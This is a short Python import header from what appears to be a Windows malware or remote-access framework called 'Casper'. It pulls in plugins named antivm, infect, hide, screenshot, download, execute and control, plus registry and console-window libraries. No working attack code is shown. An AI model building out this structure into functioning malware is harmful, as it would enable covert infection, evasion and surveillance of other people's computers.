'''
Part of Casper Framework
'''
import os
import sys
import time
import socket
import random
import base64
import urllib
import shutil
import logging
import win32gui
import win32console
from ctypes import *
from _winreg import *

# during development
logging.basicConfig(format="%(message)s",level=logging.DEBUG)

# Non standard modules
import wmi
import mss

# Plugins and features
from antivm import *
from encoder import *
from execute import *
from infect import *
from download import *
from screenshot import *
from removal import *
from hide import *
from control import *